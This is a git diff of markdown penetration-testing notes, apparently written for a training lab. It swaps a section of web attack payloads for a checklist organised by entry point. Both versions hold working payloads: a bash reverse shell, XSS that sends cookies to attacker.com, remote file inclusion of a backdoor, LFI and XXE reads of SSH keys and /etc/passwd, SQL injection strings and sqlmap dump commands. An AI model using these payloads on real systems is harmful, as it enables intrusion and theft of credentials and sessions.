@@ -621,298 +621,347 @@ droopescan scan drupal -u http://192.168.0.101
 # *Attack*
 
 ---
+👉 Check:
+# Web Attack Checklist by Entry Point
 
-<details markdown="1">
-<summary>Directory Traversal</summary>
+---
 
-```bash
-curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa
+
+<details markdown="1"><summary>URL Parameters</summary>
+
+## Examples
+
+```http
+?id=1
+?page=home.php
+?file=test.txt
+?url=http://example.com
 ```
 
+## Things to Test
+
+### SQL Injection (SQLi)
+
+```sql
+'
+"
+1 OR 1=1
+```
+
+### Insecure Direct Object Reference (IDOR)
+
+```http
+?id=1001
+?id=1002
+```
+
+### Local File Inclusion (LFI)
+
+```http
+?page=../../../../etc/passwd
+```
+
+### Server-Side Request Forgery (SSRF)
+
+```http
+?url=http://127.0.0.1
+```
+
+### Remote File Inclusion (RFI)
+
+```http
+?page=http://attacker/shell.txt
+```
+
+### Cross-Site Scripting (XSS)
+
+```html
+<script>alert(1)</script>
+```
 </details>
 
 ---
+<details markdown="1"><summary>検索フォーム</summary>
+## Example
 
-<details markdown="1">
-<summary>LFI</summary>
-
-```bash
-http://<IP>/index.php?page=../../../../etc/passwd
+```html
+<input name="search">
 ```
 
-```bash
-curl http://<IP>/index.php?file=../../../../home/user/.ssh/id_rsa
-```
-If vulnerable → read files / get creds
+## Things to Test
 
-#### Example:
-- [Executing a Command](../99_attack_repo/01-50_web/web_lfi_executing-a-command.md)
-- [Log Poisoning](../99_attack_repo/01-50_web/web_lfi_executing-a-command.md)
+### SQL Injection (SQLi)
 
----
-
-# Handling Spaces in Commands
-
-If the command you are sending contains spaces, as shown below, an error may occur.
-```bash
-ls -la
-cat /etc/passwd
+```sql
+'
+"
 ```
 
-## Solution
-Use IFS to change how spaces are interpreted
-```bash
-IFS=‘ ’  # Set IFS to space
-input="cat /etc/passwd"
+### Cross-Site Scripting (XSS)
 
-read -r cmd arg <<< “$input”
-$cmd $arg
-```
-In the example above, spaces are interpreted as %20
-```bash
-curl http://192.168.121.96/meteor/index.php?page=../../../../../../../var/log/apache2/access.log/?cmd=ls%20-ls HTTP/1.1
+```html
+<script>alert(1)</script>
 ```
 
+### Server-Side Template Injection (SSTI)
+
+```text
+{{7*7}}
+${7*7}
+```
+
+### Command Injection
+
+```bash
+;id
+&&whoami
+```
 </details>
 
 ---
+<details markdown="1"><summary>ログインフォーム</summary>
 
+## Example
 
-<details markdown="1">
-<summary>RFI</summary>
-
-```bash
-http://192.168.45.125/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=whoami
+```text
+username
+password
 ```
-If vulnerable → [ReverseShell](../98_weaponization/ReverseShell.md)
 
-```zsh
-curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.45.204/simple-backdoor.php&cmd=cat%20/etc/passwd"
+## Things to Test
+
+### SQL Injection (SQLi)
+
+```sql
+admin'--
 ```
-#### Example:
-- [ RFI Using an Existing Web Shell File](../99_attack_repo/01-50_web/web_lfi_executing-a-command.md)
--  [Using Pentestmonkey](../99_attack_repo/01-50_web/web_lfi_executing-a-command.md)
- [5_php_wrapper](../97_tools/5_php_wrapper.md)
-*By using a wrapper, it is possible to bypass filters in PHP web applications or execute code by exploiting file inclusion vulnerabilities.*
 
+### Default Credentials
+
+```text
+admin:admin
+admin:password
+root:root
+```
+
+### Password Spraying
+
+```text
+Summer2025!
+Winter2025!
+CompanyName123!
+```
 </details>
 
 ---
+<details markdown="1"><summary>File Upload</summary>
+## Example
 
-
-<details markdown="1">
-<summary>Command Injection</summary>
-
-```bash
-; id
+```html
+<input type="file">
 ```
 
-```zsh
-&& whoami
+## Things to Test
+
+### Upload Bypass
+
+```text
+shell.php
+shell.phtml
+shell.php.jpg
+shell.jpg.php
+shell.phar
+shell.php5
 ```
 
-```bash
-"; /bin/bash -c 'bash -i >& /dev/tcp/192.168.45.204/4444 0>&1' ; #"
-```
-→ If vulnerable → [Reverse Shell](../03_initial_access/reverse_shell.md)
-
-#### Example:
--  [git command](../99_attack_repo/01-50_web/01_web_command-injection_git.md)
-
-</details>
-
----
-
-<details markdown="1">
-<summary>File Upload</summary>
-# File Upload
-
-```bash
-curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=dir
-```
-
-#### Example:
-- [Create Powershell Oneliner](../99_attack_repo/01-50_web/web_fileupload.md)
-- [If you can't use nc](../99_attack_repo/01-50_web/web_fileupload.md)
-- [If there are restrictions on uploading ASP and ASPX files](https://github.com/yangbaopeng/ashx_webshell)
-- [Using Non-Executable Files]()
-
-👉 Try:
-
-* `.php`
-* extension spoofing(`.pHP`)
-* double extension (`shell.php.jpg`)
-* MIME bypass
-
-→ If success → execute shell
-
-</details>
-
----
-
-
-<details markdown="1">
-<summary>SQL Injection</summary>
-#### Validity Check
-Enter `‘ or '1’='1';--` and use a tool such as **BurpSuite** to check if the behavior differs from that of a normal input.
-
-```zsh
-admin' or '1'='1
-```
-
-```zsh
-'or '1'='1 --
-```
-
-```
-`"or "1"="1`
-```
-
-```
-"or "1"="1" --
-```
-
-```
-") or "1"="1 --`
-```
-
-```
-"or 1=1 --
-```
-
-```zsh
-kevin' OR 1=1 -- //
-```
-
-```
-' or 1=1 in (select @@version) -- //
-```
-
-```
-' OR 1=1 in (SELECT * FROM users) -- //
-```
-
-```
-' or 1=1 in (SELECT password FROM users) -- //
-```
-
-```
-' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
-```
-
-#### Determining the number of columns
-
-```bash
-' union select null, null, null, null, null;--
-```
-
-```bash
-' or 1=1 order by 10 #
-```
-
-## sqlmap
-
-| option | Description | Example |
-| -u | URL | `sqlmap -u http://10.10.10.1/` |
-| --batch | Disable interactive mode | `sqlmap -u URL --batch` |
-| -dbs | Retrieve available database names | `sqlmap -u URL --dbs` |
-| --tables | table list | `sqlmap -u URL -D --tables` |
-| --dump | culm list | `sqlmap -u <target_URL> -D <database_name> -T <table_name> --dump` |
-| --all | Retrieve all information | `sqlmap -u URL --all` |
-
-```bash
-sqlmap -u "http://<IP>/index.php?id=1" --dump --batch
-```
-
-```bash
-sqlmap -r site.txt --dump --batch
-```
-
-##### Example:
-MSSQL
-
-```zsh
-sqlmap -r login-page.txt --dbms=mssql --dbs --technique=t --risk 3 --level 5 --batch
-```
-
-</details>
-
----
-
-<details markdown="1">
-<summary>XSS</summary>
-
-#### Basic Syntax
+### XXE (SVG Upload)
 
 ```xml
-<script>alert(‘XSS’);</script>
+<!DOCTYPE foo>
 ```
 
-## Image File Format
+### Image Processing Vulnerabilities
 
-```xml
-<script>
-new Image().src = ‘http://attacker.com/steal?c=’ + document.cookie;
-</script>
+```text
+ImageMagick
+ExifTool
+GraphicsMagick
 ```
-
-## Sending with Parameters
-
-```xml
-<script>
-location.href=‘http://attacker.com/log?cookie=’+document.cookie
-</script>
-```
-
-```xml
-<script>
-fetch(‘http://attacker.com/log?cookie=’ + encodeURIComponent(document.cookie));
-</script>
-```
-
-## The server-side processing (`steal.php`) that allows the attacker to receive the cookie is as follows
-```php
-<?php 
-file_put_contents(‘cookies.txt’, $_GET[‘c’] . “\n”, FILE_APPEND); 
-?>
-```
-
 </details>
 
 ---
 
+<details markdown="1"><summary>File Download</summary>
 
-<details markdown="1">
-<summary>XXE</summary>
-#### Example:
-#### read /etc/passwd
+## Example
 
-```xml
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [  <!ENTITY xxe SYSTEM "file:///etc/passwd">]>
-<root>
-<name>hoge</name><tel>12345678901</tel><email>&xxe;</email><password>hoge</password></root>
+```http
+download.php?file=
 ```
-![](../../assets/images/Pasted%20image%2020260507093552.png)
 
-#### read .bashrc
+## Things to Test
 
-```xml
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/home/saket/.bashrc">]>
-<root>
-<name>hoge</name><tel>12345678901</tel><email>&xxe;</email><password>hoge</password></root>
+### Directory Traversal
+
+```text
+../../../etc/passwd
 ```
-![](../../assets/images/Pasted%20image%2020260507093608.png)
 
+### Local File Inclusion (LFI)
+
+```text
+../../../../windows/win.ini
+```
 </details>
 
 ---
 
-Next
+<details markdown="1"><summary>URL Paths</summary>
+## Examples
+
+```http
+/profile/1001
+/api/user/1
+```
+
+## Things to Test
+
+### Insecure Direct Object Reference (IDOR)
+
+```text
+1001 → 1002
+1 → 2
+```
+
+### Directory Traversal
+
+```text
+../../../etc/passwd
+```
+</details>
 
 ---
 
+<details markdown="1"><summary>XML Input</summary>
+
+## Example
+
+```xml
+<user>test</user>
+```
+
+## Things to Test
+
+### XML External Entity (XXE)
+
+```xml
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+```
+</details>
+
+---
+
+<details markdown="1"><summary>JSON APIs</summary>
+
+## Example
+
+```json
+{
+  "username": "test"
+}
+```
+
+## Things to Test
+
+### Insecure Direct Object Reference (IDOR)
+
+```json
+{
+  "userid": 1001
+}
+```
+
+### SQL Injection (SQLi)
+
+```json
+{
+  "username": "'"
+}
+```
+
+### Server-Side Template Injection (SSTI)
+
+```json
+{
+  "name": "{{7*7}}"
+}
+```
+</details>
+
+---
+
+<details markdown="1"><summary>HTTP Headers</summary>
+
+## Common Headers
+
+```http
+Host:
+Referer:
+User-Agent:
+X-Forwarded-For:
+```
+
+## Things to Test
+
+### Cross-Site Scripting (XSS)
+
+```http
+User-Agent: <script>alert(1)</script>
+```
+
+### Server-Side Template Injection (SSTI)
+
+```http
+User-Agent: {{7*7}}
+```
+
+### Log Poisoning
+
+```http
+User-Agent: <?php system($_GET['cmd']); ?>
+```
+
+---
+
+<details markdown="1"><summary>Cookies</summary>
+## Example
+
+```http
+Cookie: role=user
+```
+
+## Things to Test
+
+### Privilege Escalation
+
+```http
+role=admin
+isAdmin=true
+uid=1
+```
+
+### Deserialization
+
+```text
+Base64
+JWT
+Serialized Objects
+PHP Serialization
+Java Serialization
+```
+</details>
+
+---
 ## Credentials Found?
 
 👉 If yes:
